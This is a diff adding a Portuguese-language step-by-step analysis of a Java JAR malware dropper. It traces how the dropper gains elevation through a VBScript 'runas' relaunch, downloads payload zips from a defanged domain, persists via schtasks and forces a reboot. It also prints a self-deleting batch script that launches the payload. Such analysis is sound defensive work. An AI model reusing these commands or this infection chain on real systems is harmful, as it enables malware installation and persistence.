@@ -1,0 +1,99 @@
+==== Primeira execução do JAR :
+
+Programa verifica que arquivo não existe
+- C:\Users\Juliano\AppData\Roaming/14042017.REG
+
+Programa verifica que o sistema não é Windows XP
+
+Programa verifica que NÃO recebeu parâmetros
+
+Programa cria VBScript
+- Juliano36154852092750.vbs
+
+Programa Executa VBScript
+- C:\Windows\System32\wscript.exe "C:\Users\Juliano\AppData\Local\Temp\Juliano36154852092750.vbs"
+
+VBScript executa novamente o próprio JAR com privilégios elevados passando um argumento "0"
+- .ShellExecute "C:\Program Files\Java\jre1.8.0_121\bin\java.exe","-jar ""C:\Users\Juliano\workspace\Dazzlebird\bin"" 0",,"runas",0
+
+
+==== Segunda execução do JAR :
+
+Programa verifica que arquivo não existe
+- C:\Users\Juliano\AppData\Roaming/14042017.REG
+
+Programa verifica que o sistema não é Windows XP
+
+Programa verifica que recebeu parâmetros
+
+Programa cria arquivo UAC.YES
+- C:\Users\Juliano\AppData\Local\Temp\UAC.YES
+
+Programa verifica a arquitetura do sistema operacional
+- C:\Program Files (x86) está presente?
+
+Programa realiza download de arquivo conforme arquitetura do sistema
+- hXtp://detran.life/S//Win32.zip
+- hXtp://detran.life/S//Win64.zip
+
+Programa verifica que arquivo zip está presente
+- C:\Users\Juliano\AppData\Roaming\Microsoft\JULIANO-PC.zip
+
+Programa verifica que NÃO existe arquivo EXE
+- C:\Users\Juliano\AppData\Roaming\Microsoft\*.exe
+
+Programa apaga arquivos diferentes de .jar .ini .xml .zip
+- C:\Users\Juliano\AppData\Roaming\Microsoft\
+
+Programa tenta extrair arquivos do zip
+
+Programa sinaliza que vai apagar arquivo zip ao término da execução
+
+Programa renomeia arquivo executável
+- svcsrrs.exe para Java35176452476445.exe
+
+Programa aguarda 2 segundos
+
+Programa cria arquivo
+- C:\Users\Juliano\AppData\Local\Temp\Juliano35176452476445Reg32.xml
+
+Programa aguarda 2 segundos
+
+Programa executa comando
+- schtasks /Create /TN "Java35176452476445"  /xml "C:\Users\Juliano\AppData\Local\Temp\Juliano35176452476445Reg32.xml"
+
+Programa aguarda 5 segundos
+
+Programa cria arquivo de registro
+- C:\Users\Juliano\AppData\Roaming\14042017.REG
+
+Programa verifica que pasta Program Files X86 existe
+
+Programa executa comando
+- shutdown -f -r -t 30 -c LogOff...
+
+Programa cria novo arquivo VBScript
+- C:\Users\Juliano\AppData\Local\Temp\Juliano35176452476445.vbs
+
+Programa que a arquitetura do sistema operacional é x64
+- Obtém propriedade da arquitetura do processador
+
+- Programa executa VBScript com programa correspondente à arquitetura do SO
+C:\Windows\SysWoW64\wscript.exe "C:\Users\Juliano\AppData\Local\Temp\Juliano35176452476445.vbs"
+
+Programa encerra
+
+
+==== Outros resultados
+
+Em um dado fluxo, se a pasta Program Files X86 não existir então o programa cria o seguinte script e executa a seguir:
+
+Script C:\Users\Juliano\AppData\Roaming\Microsoft\JULIANO-PC.bat
+
+@ECHO OFF
+::Encrypt
+(set CHAR[A]=UDFMHD45)
+::Decrypt
+(set CHAR[UDFMHD45]=A)
+start /d "%appdata%\Microsoft" Windows.exe /nogui Windows.txt
+DEL "%~f0"
